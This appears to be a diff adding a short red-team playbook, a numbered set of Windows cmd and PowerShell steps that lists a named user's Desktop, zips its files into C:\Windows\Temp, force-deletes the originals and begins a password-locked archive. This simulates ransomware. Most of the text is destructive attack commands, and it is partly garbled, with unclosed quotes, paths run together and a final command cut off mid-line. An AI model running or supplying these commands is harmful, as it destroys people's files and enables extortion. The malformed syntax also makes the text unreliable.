@@ -1,0 +1,11 @@
+1. Identify Target Files
+`cmd dir C:\Users\jcruz\Desktop
+
+2.Compress and Lock Filescmd
+powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop* -DestinationPath C:\Windows\Temp\locked_files.zip -F
+
+3. Remove Original Files (Impact)cmd
+del /f /q C:\Users\jcruz\Desktop*.*
+
+4. Optional – Password Protected Archivecmd
+powershell -c "$password = ConvertTo-SecureString 'LockedByRedTeam' -AsPlainText -Force; Compress-Archive -Path C:\Users\jcruz
